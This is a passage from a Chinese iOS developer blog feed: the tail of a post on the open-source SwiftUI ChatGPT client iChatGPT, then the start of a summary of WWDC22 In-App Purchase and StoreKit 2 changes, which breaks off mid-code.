class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data: &#123;<span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;create_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;update_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [<span class="string">&quot;我&quot;</span>]&#125;, <span class="string">&quot;end_turn&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">1.0</span>, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;, <span class="string">&quot;recipient&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;, <span class="string">&quot;conversation_id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>: &#123;<span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;create_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;update_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [<span class="string">&quot;我无&quot;</span>]&#125;, <span class="string">&quot;end_turn&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">1.0</span>, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;, <span class="string">&quot;recipient&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;, <span class="string">&quot;conversation_id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>: &#123;<span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;create_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;update_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [<span class="string">&quot;我无法&quot;</span>]&#125;, <span class="string">&quot;end_turn&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">1.0</span>, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;, <span class="string">&quot;recipient&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;, <span class="string">&quot;conversation_id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line">中间省略xxxx行</span><br><span class="line">中间省略xxxx行</span><br><span class="line">中间省略xxxx行</span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>: &#123;<span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;create_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;update_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [<span class="string">&quot;我无法确定全球当前的人口数量，因为我没有浏览网页的能力&quot;</span>]&#125;, <span class="string">&quot;end_turn&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">1.0</span>, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;, <span class="string">&quot;recipient&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;, <span class="string">&quot;conversation_id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>: &#123;<span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;create_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;update_time&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;parts&quot;</span>: [<span class="string">&quot;我无法确定全球当前的人口数量，因为我没有浏览网页的能力。&quot;</span>]&#125;, <span class="string">&quot;end_turn&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">1.0</span>, <span class="string">&quot;metadata&quot;</span>: &#123;&#125;, <span class="string">&quot;recipient&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;, <span class="string">&quot;conversation_id&quot;</span>: <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>所以，需要按行分割，然后取倒数第四行的内容，再去掉 <code>data: </code> 字符才是我们想要的 json 内容。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let <span class="keyword">lines</span> = <span class="keyword">text</span>.components(separatedBy: <span class="string">&quot;\n&quot;</span>)<span class="comment"></span></span><br><span class="line"><span class="comment">// 倒数第四行，第6个字符后开始</span></span><br><span class="line">let str = <span class="keyword">lines</span>[<span class="keyword">lines</span>.count - <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>当然，目前 ChatGPT 还是 beta 阶段，所以暂时没有开放 API，后续如果提供 API，就会更加方便！</p><h3 id="五、ChatGPT-的一些问题"><a href="#五、ChatGPT-的一些问题" class="headerlink" title="五、ChatGPT 的一些问题"></a>五、ChatGPT 的一些问题</h3><h4 id="是否收费"><a href="#是否收费" class="headerlink" title="是否收费"></a>是否收费</h4><p>目前 ChatGPT 是 beta 免费使用阶段，未来 API 请求会收费，具体可参考 <a href="https://openai.com/blog/">https://openai.com/blog</a>。</p><h4 id="修改头像"><a href="#修改头像" class="headerlink" title="修改头像"></a>修改头像</h4><p>ChatGPT 对话的个人头像，大家发现无法有 <a href="https://openai.com/">https://openai.com</a> 上进行修改。因为目前使用的是 <a href="https://cn.gravatar.com/">Gravatar</a> 服务。</p><p>Gravatar，全称 <code>Globally Recognized Avatar</code>。翻译成中文叫：全球通用头像。</p><p>Gravatar 的概念首先是在国外的独立 WordPress 博客中兴起的，当你到任何一个支持Gravatar的网站留言时，这个网站都会根据你所提供的Email地址为你显示出匹配的头像。当然，这个头像，是需要你事先到 Gravatar 的网站注册并上传的，否则，在这个网站上，就只会显示成一个默认的头像。</p><p>简单来说，就是头像链接为 <code>https://s.gravatar.com/avatar/xxx</code>，其中 <code>xxx</code> 就是你登陆邮箱的 MD5 值，只要在 <a href="https://cn.gravatar.com/">Gravatar</a> 注册验证了这个邮箱，你就可以更新头像，或者任何人都可以获取你的头像，只要知道你的邮箱。详细可以参考：<a href="https://en.gravatar.com/site/implement/images/">Image Requests - Globally</a></p><h4 id="有趣的对话"><a href="#有趣的对话" class="headerlink" title="有趣的对话"></a>有趣的对话</h4><p>写一首诗，庆祝 iChatGPT app 开源：</p><p><img src="https://ihtcboy.com/images/2022-iChatGPT-07.jpeg" alt="iChatGPT-07"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">咦，知道 iChatGPT </span><br><span class="line"></span><br><span class="line">它酷炫极了，支持语言模型交互</span><br><span class="line"></span><br><span class="line">它开源了，人人可用</span><br><span class="line"></span><br><span class="line">快来下载，体验它的强大</span><br><span class="line"></span><br><span class="line">它可以帮助你，完成复杂任务</span><br><span class="line"></span><br><span class="line">不论是写文章，还是做研究</span><br><span class="line"></span><br><span class="line">它是程序员的好帮手</span><br><span class="line"></span><br><span class="line">让工作更高效，更愉快</span><br><span class="line"></span><br><span class="line">啦啦啦，iChatGPT </span><br><span class="line"></span><br><span class="line">开源了，万岁！</span><br></pre></td></tr></table></figure><p>直呼牛~</p><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>目前 iChatGPT 开源地址：<a href="https://github.com/37iOS/iChatGPT">https://github.com/37iOS/iChatGPT</a> 。还有很多功能没有实现，比如：</p><ul><li>保存对话</li><li>显示个人头像</li><li>代码没有高亮</li><li>请求失败重试等等</li></ul><p>欢迎大家提 PR ！</p><p>另外，我们近期也会更新 <a href="https://juejin.cn/post/7081069026515877919">AppleParty</a>，更新苹果批量上传内购商品功能，敬请期待~</p><p>最后，大家觉得 <code>ChatGPT</code> 解决了什么痛点？有什么期待吗</p><p>欢迎大家评论区一起讨论交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ul><li><a href="https://github.com/37iOS/iChatGPT">37iOS/iChatGPT - GitHub</a></li><li><a href="https://chat.openai.com/">OpenAI ChatGPT</a></li><li><a href="https://openai.com/blog/">OpenAI Blog</a></li><li><a href="https://github.com/A-kirami/nonebot-plugin-chatgpt">A-kirami/nonebot-plugin-chatgpt</a></li><li><a href="https://en.gravatar.com/site/implement/images/">Image Requests - Globally</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7175051294808211512&quot;&gt;用 SwiftUI 实现 AI 聊天对话 app - iChatGPT - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;p&gt;关于 ChatGPT 的话题，大家都不陌生，我们直入话题，因为 ChatGPT 目前限制中国访问服务，所以如果直接使用 ChatGPT 网页进行对话，还是不太方便。通过 ChatGPT SessionToken 就可以不限制网络访问，所以大家发挥想象力实现各种的聊天机器人、小程序，而原生 app 可能体验更好！所以就有了 iChatGPT！一款用 SwiftUI 实现的开源 ChatGPT app，欢迎大家关注和 pr。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="ChatGPT" scheme="https://ihtcboy.com/tags/ChatGPT/"/>
    
    <category term="SwiftUI" scheme="https://ihtcboy.com/tags/SwiftUI/"/>
    
    <category term="OpenAI" scheme="https://ihtcboy.com/tags/OpenAI/"/>
    
  </entry>
  
  <entry>
    <title>WWDC22 - In App Purchase 更新总结</title>
    <link href="https://ihtcboy.com/2022/07/11/2022-07-11_WWDC22-InAppPurchase%E6%9B%B4%E6%96%B0%E6%80%BB%E7%BB%93/"/>
    <id>https://ihtcboy.com/2022/07/11/2022-07-11_WWDC22-InAppPurchase%E6%9B%B4%E6%96%B0%E6%80%BB%E7%BB%93/</id>
    <published>2022-07-11T03:54:10.000Z</published>
    <updated>2022-12-31T15:35:14.743Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7118958291446661134">WWDC22 - In App Purchase 更新总结 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><p>WWDC21 是历年来 In App Purchase（IAP，内购内购买）最大变化的一年，分别推出了 StoreKit 2、App Store Server API、App Store Server Notifications V2 三大特性，去年我们也编写了 <a href="https://juejin.cn/post/6974733392260644895">《苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21》</a> 文章，所以我们本文不会再深入提及去年的更新，大家如果不太熟悉，可以先温习一下。本文将对今年 WWDC22 带来的变化，从整体的视角一起回顾。</p><span id="more"></span><p><img src="https://ihtcboy.com/images/WWDC22-IAP-00.png" alt="WWDC22-IAP-00"></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>WWDC21 是历年来 In App Purchase（IAP，内购内购买）最大变化的一年，分别推出了 StoreKit 2、App Store Server API、App Store Server Notifications V2 三大特性，去年我们也编写了 <a href="https://juejin.cn/post/6974733392260644895">《苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21》</a> 文章，所以我们本文不会再深入提及去年的更新，大家如果不太熟悉，可以先温习一下。本文将对今年 WWDC22 带来的变化，从整体的视角一起回顾。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-01.png" alt="WWDC22-IAP-01"></p><p>以下是编者对 In App Purchase 这几年重要的更新或调整的梳理：</p><table><thead><tr><th>时间</th><th align="left">事件</th><th>变化</th><th>来源</th></tr></thead><tbody><tr><td>2020 年 11 月 18 日</td><td align="left">App Store 小型企业计划</td><td>日历年收入在 100 万美元以下的小型和独立开发者将可以享受 15% 的佣金费率，仅为 App Store 标准佣金费率 30% 的一半，付费 app 和 App 内购买项目的收益抽成将降低 15％。</td><td><a href="https://developer.apple.com/cn/news/?id=i7jzeefs">1</a>、<a href="https://developer.apple.com/cn/news/?id=6lyxewwp">2</a></td></tr><tr><td>2020 年 11 月 23 日</td><td align="left">针对在线多人活动的 app 内购买项目规定</td><td>3.1.3(d) 一对一服务：如果您的 App 允许购买两个人之间的一对一实时服务 (例如，学生辅导、医疗咨询、看房服务或健身训练)，您可以使用 App 内购买项目以外的其他购买方式来收取相应款项。一对几和一对多的实时服务则必须使用 App 内购买项目。</td><td><a href="https://developer.apple.com/cn/news/?id=yeyd5xuh">1</a>、<a href="https://developer.apple.com/cn/app-store/review/guidelines/#in-app-purchase">2</a></td></tr><tr><td>2021 年 8 月 26 日</td><td align="left">Apple 与美国开发者就 App Store 达成和解</td><td>美国开发者提起的 App Store 集体诉讼与苹果和解，Apple 设立一亿美元的基金来帮助美国的小型业务开发者，符合条件的开发者获得 250 美元至 3 万美元的现金）。</td><td><a href="https://developer.apple.com/cn/news/?id=r24k5i3m">1</a>、<a href="https://www.apple.com.cn/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/">2</a></td></tr><tr><td>2021 年 9 月 1 日</td><td align="left">日本公平贸易委员会结束对 App Store 的调查</td><td>3.1.3(a) “阅读器”类型的 App：此类 App 可以允许用户访问先前购买的内容或内容订阅 (具体包括：杂志、报纸、图书、音频、音乐和视频)。各种阅读器 App 可以为使用免费版本的用户提供帐户创建功能，并为现有用户提供帐户管理功能。阅读器 App 开发者可以申请 External Link Account 授权，以在其 App 中提供一个指向其拥有或负责维护的网站的信息链接，以便用户创建或管理帐户。了解有关 <a href="https://developer.apple.com/cn/support/reader-apps/">External Link Account</a> 授权的更多信息。</td><td><a href="https://www.apple.com.cn/newsroom/2021/09/japan-fair-trade-commission-closes-app-store-investigation/">1</a>、<a href="https://developer.apple.com/cn/news/?id=grjqafts">2</a></td></tr><tr><td>2022 年 1 月 14 日</td><td align="left">针对在荷兰 App Store 上分发的约会 App 的更新</td><td>荷兰消费者和市场管理局（ACM）允许荷兰 App Store 上的约会 App 开发人员与用户共享额外的付款处理选项。允许仅在荷兰 App Store 中分发的约会 App 在 App 内提供其他支付处理选项。开发者可以使用 StoreKit 外部购买授权，苹果降低 3% 的佣金，可与小型企业计划或自动续期订阅的 15 %佣金叠加，最低抽成 12 %。</td><td><a href="https://developer.apple.com/news/?id=3bttqj0z">1</a>、<a href="https://developer.apple.com/cn/support/storekit-external-entitlement/">2</a></td></tr><tr><td>2022 年 5 月 16 日</td><td align="left">自动续期订阅提价更新</td><td>目前，当自动续期订阅提价时，订阅者必须在 App 提价之前选择接受。<strong>新调整</strong>：符合某些特定条件并在提前通知用户的情况下，开发者在为自动续订订阅提价时，无需用户额外采取行动，亦不会中断服务。（前提条件：每年提价不超过一次，同时订阅价格上调不超过 5 美元和 50%，或者年度订阅价格上调不超过 50 美元和 50%，并且是在法律允许的范围内。）</td><td><a href="https://developer.apple.com/cn/news/?id=tpgp89cl">1</a>、<a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/devc9870599e">2</a></td></tr><tr><td>2022 年 6 月 30 日</td><td align="left">针对在韩国分发 App 的更新</td><td>允许仅在韩国 App Store 中分发的 App 在 App 内提供其他支付处理选项。开发者可以使用 StoreKit 外部购买授权，但苹果收益抽成 26%。</td><td><a href="https://developer.apple.com/cn/news/?id=q0feipe4">1</a>、<a href="https://developer.apple.com/cn/support/storekit-external-entitlement-kr/">2</a></td></tr></tbody></table><p>说到内购，环绕着的新闻，总起到一些波澜，从 2021 年苹果推出 App Store 小型企业计划，降低 15% 的佣金，大家的讨论一直源源不断，对于小型企业和开发者，确实是明显感受到 15% 带来的回报！本文不去讨论合理性，App Store 从 2008 年推出就是一个创举，它改变了世界对 App 的认识。我们本文更多的是讨论如果利用这些变化，为用户提供更好的服务或体验！</p><p>本文主要从四方面进行探讨：</p><ol><li>StoreKit 2</li><li>App Store Server API</li><li>App Store Server Notifications V2</li><li>App Store Connect</li></ol><h3 id="StoreKit-2"><a href="#StoreKit-2" class="headerlink" title="StoreKit 2"></a>StoreKit 2</h3><p>StoreKit 2 和 Original StoreKit，应该怎么选择？苹果在<a href="https://developer.apple.com/documentation/storekit/choosing_a_storekit_api_for_in-app_purchase">选择文档</a>在给出了答案：</p><ul><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase">StoreKit 2</a>: 一个基于 Swift 的 API，以 JSON Web Signature (JWS) 格式提供 Apple 签名交易验证，从 iOS 15、macOS 12、tvOS 15 和 watchOS 8 开始提供。</li><li><a href="https://developer.apple.com/documentation/storekit/original_api_for_in-app_purchase">Original API for In-App Purchase</a>: 一个使用 App Store 收据提供交易信息的API，从 iOS 3、macOS 10.7、tvOS 9 和 watchOS 6.2 开始提供。</li></ul><p>去年的文章，我们提到以下功能必须依赖 Original StoreKit API：</p><ol><li>为批量购买计划（VPP，Volume Purchase Program）提供支持。有关更多信息，请参阅 <a href="https://developer.apple.com/documentation/devicemanagement">设备管理</a>。</li><li>提供应用预订（app pre-orders）。有关更多信息，请参阅 <a href="https://developer.apple.com/app-store/pre-orders/">应用预订</a>。</li><li>您的 App 从收费更改为免费 App，反之亦然。</li><li>推广应用内购买。有关更多信息，请参阅 <a href="https://developer.apple.com/app-store/promoting-in-app-purchases/">推广应用程序内购买</a>。</li><li>对现有和历史遗留的旧 App 使用 v1 API。</li></ol><p>因此，今年的 StoreKit 2，苹果提供新的字段 <a href="https://developer.apple.com/documentation/storekit/apptransaction/4013175-preorderdate">preorderDate</a> 和 <a href="https://developer.apple.com/documentation/storekit/apptransaction/3954448-originalpurchasedate">originalPurchaseDate</a> 来获取 App 预订时间和购买时间，但是只支持 iOS 16+。</p><p>所以，目前 iOS 16 和 StoreKit 2 不能解决的问题：</p><ol><li>为批量购买计划（VPP，Volume Purchase Program）提供支持。有关更多信息，请参阅 <a href="https://developer.apple.com/documentation/devicemanagement">设备管理</a>。</li><li>推广应用内购买。有关更多信息，请参阅 <a href="https://developer.apple.com/app-store/promoting-in-app-purchases/">推广应用程序内购买</a>。</li><li>对现有和历史遗留的旧 App 使用 Original StoreKit API。</li></ol><p><strong>2022年，如何选择 Original StoreKit 还是 StoreKit 2</strong></p><p>对于支持低于 iOS 15 以下 app 依然需要使用 Original StoreKit，直到只支持 iOS 15+，并且支持迁移到 StoreKit 2。对于目前开发者来说，使用 StoreKit 2 的成本主要是兼容的系统版本，还有一方面是服务端的兼容，最后是 app 如果有 IAP 服务，那一定是核心业务，不容许一点点的错误！这导致了大多数 app 还处于围观 StoreKit 2 的状态。对于只支持 iOS 15+ 或者独立开发者，建议可以尝试使用 StoreKit 2，如果有异常时，降级到 Original StoreKit 就可以。总之，最后等时间给我们答案吧。</p><h4 id="App-Transaction（App-交易）"><a href="#App-Transaction（App-交易）" class="headerlink" title="App Transaction（App 交易）"></a>App Transaction（App 交易）</h4><p>StoreKit 2 增加了 <a href="https://developer.apple.com/documentation/storekit/apptransaction">App Transaction</a> 结构体，用于代替 Original StoreKit 的 receipt 内容，具体直接查看接口文档：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// Represents signed transaction information for an app purchase.</span></span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">16.0</span>, <span class="keyword">macOS</span> <span class="number">13.0</span>, <span class="keyword">tvOS</span> <span class="number">16.0</span>, <span class="keyword">watchOS</span> <span class="number">9.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">struct</span> <span class="title">AppTransaction</span> : <span class="title">Sendable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The JSON representation of the transaction.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> jsonRepresentation: <span class="type">Data</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// A number the App Store uses to uniquely identify the application.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> appID: <span class="type">UInt64</span>?</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The application version the transaction is for.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> appVersion: <span class="type">String</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// A number the App Store uses to uniquely identify the version of the application.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> appVersionID: <span class="type">UInt64</span>?</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Identifies the application the transaction is for.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> bundleID: <span class="type">String</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The server environment this transaction was created in.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> environment: <span class="type">AppStore</span>.<span class="type">Environment</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The version of the app originally purchased.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> originalAppVersion: <span class="type">String</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The date this original app purchase occurred on.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> originalPurchaseDate: <span class="type">Date</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The date this app was preordered.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> preorderDate: <span class="type">Date</span>?</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// A SHA-384 hash of `AppStore.deviceVerificationID` appended after</span></span><br><span class="line">    <span class="comment">/// `deviceVerificationNonce` (both lowercased UUID strings).</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> deviceVerification: <span class="type">Data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The nonce used when computing `deviceVerification`.</span></span><br><span class="line">    <span class="comment">/// - SeeAlso: `AppStore.deviceVerificationID`</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> deviceVerificationNonce: <span class="type">UUID</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The date this transaction was generated and signed.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> signedDate: <span class="type">Date</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Get the cached `AppTransaction` for this version of the app or make</span></span><br><span class="line">    <span class="comment">/// a request to get one from the App Store server if one has not been cached yet.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> shared: <span class="type">VerificationResult</span>&lt;<span class="type">AppTransaction</span>&gt; &#123; <span class="keyword">get</span> <span class="keyword">async</span> <span class="keyword">throws</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Refreshes the shared `AppTransaction` from the App Store server.</span></span><br><span class="line">    <span class="comment">/// Calling this function will force an authentication dialog to display to the user.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">refresh</span>()</span> <span class="keyword">async</span> <span class="keyword">throws</span> -&gt; <span class="type">VerificationResult</span>&lt;<span class="type">AppTransaction</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>App Transaction</code> 从以上接口可以获取 App 预订时间 <a href="https://developer.apple.com/documentation/storekit/apptransaction/4013175-preorderdate">preorderDate</a> 和购买时间 <a href="https://developer.apple.com/documentation/storekit/apptransaction/3954448-originalpurchasedate">originalPurchaseDate</a> 等。另外，验证用户当前使用的 app 是否正品购买以防止欺诈的作用。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-02.png" alt="WWDC22-IAP-02"></p><ul><li>购买您的 app 的签名信息</li><li>使用 JWS 签名</li><li>替换 Original StoreKit 的 receipt（票据）</li><li>StoreKit 提供验证方法</li><li>开发者可以执行自己的验证（或处理）</li></ul><p>验证 App Transaction 的方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">16.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">verificationAppTransaction</span>()</span> &#123;</span><br><span class="line">    <span class="type">Task</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> verificationResult <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> <span class="type">StoreKit</span>.<span class="type">AppTransaction</span>.shared</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> verificationResult &#123;</span><br><span class="line">            <span class="keyword">case</span> .verified(<span class="keyword">let</span> appTransaction):</span><br><span class="line">                <span class="comment">// StoreKit verified that the user purchased this app and</span></span><br><span class="line">                <span class="comment">// the properties in the AppTransaction instance.</span></span><br><span class="line">                <span class="comment">// Add your code here.</span></span><br><span class="line">            <span class="keyword">case</span> .unverified(<span class="keyword">let</span> appTransaction, <span class="keyword">let</span> verificationError):</span><br><span class="line">                <span class="comment">// The app transaction didn&#x27;t pass StoreKit&#x27;s verification.</span></span><br><span class="line">                <span class="comment">// Handle unverified app transaction information according</span></span><br><span class="line">                <span class="comment">// to your business model.</span></span><br><span class="line">                <span class="comment">// Add your code here.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="comment">// Handle errors.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 